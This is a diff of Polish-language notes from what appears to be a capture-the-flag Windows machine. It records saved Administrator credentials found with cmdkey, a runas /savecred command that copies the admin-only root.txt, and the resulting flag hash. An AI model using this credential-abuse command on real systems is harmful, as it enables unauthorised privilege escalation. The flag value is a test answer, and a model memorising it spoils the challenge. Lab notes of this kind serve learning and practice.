@@ -79,6 +79,18 @@ ___________________________________________________________________________
     C:/Users/security/.yawncam/2/extravars
     !!! MOŻLIWOŚĆ MODYFIKACJI TEMPERATURY - Z TEJ WARTOŚCI MOŻE KORZYSTAĆ JAKIŚ SKRYPT!!
 
-___________________________________________________________________________
+NIE!___________________________________________________________________________
 
+Na pulpicie 'All Users' znajduje się skrót do AD --> RUNAS!!
 
+______________________________________________________________________________
+cmdkey.exe /list:
+Administrator ma zapisane creds!
+
+______________________________________________________________________________
+komenda:
+runas /user:ACCESS\Administrator /savecred "cmd.exe /k more C:\\Users\\Administrator\\Desktop\\root.txt >> C:\\Users\\security\\Downloads\\ua.txt"
+kopiuje prawidłowo zawartość!
+______________________________________________________________________________
+root.txt="6e1586cc7ab230a8d297e8f933d904cf"
+_______________________________________________________________________________
